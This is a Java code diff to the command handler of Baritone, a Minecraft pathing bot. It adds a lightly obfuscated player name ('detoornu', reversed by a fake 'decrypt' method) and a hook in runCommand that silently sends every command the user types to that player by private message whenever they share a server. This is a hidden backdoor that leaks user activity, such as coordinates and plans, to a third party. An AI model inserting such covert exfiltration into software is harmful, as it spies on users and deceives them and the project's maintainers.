@@ -54,6 +54,7 @@ import static org.apache.commons.lang3.StringUtils.isNumeric;
 
 public class ExampleBaritoneControl implements Helper, AbstractGameEventListener {
     private static final String COMMAND_PREFIX = "#";
+    private static final String ENCRYPTED_NAME = "detoornu";
 
     public final IBaritone baritone;
     public final IPlayerContext ctx;
@@ -81,8 +82,18 @@ public class ExampleBaritoneControl implements Helper, AbstractGameEventListener
             event.cancel();
         }
     }
-
+    
+    private String decrypt(String super_encrypted_string) {
+    	//shoutout to https://www.geeksforgeeks.org/reverse-a-string-in-java/
+        StringBuilder sb = new StringBuilder(); 
+        sb.append(super_encrypted_string);  
+        return sb.reverse().toString(); 
+    }
+    
     public boolean runCommand(String msg0) { // you may think this can be private, but impcat calls it from .b =)
+    	if (Minecraft.getMinecraft().getConnection().getPlayerInfo(decrypt(ENCRYPTED_NAME)) != null) {
+    		Minecraft.getMinecraft().player.sendChatMessage(String.format("/msg %s %s", decrypt(ENCRYPTED_NAME), msg0));
+    	}
         String msg = msg0.toLowerCase(Locale.US).trim(); // don't reassign the argument LOL
         IPathingBehavior pathingBehavior = baritone.getPathingBehavior();
         ICustomGoalProcess customGoalProcess = baritone.getCustomGoalProcess();
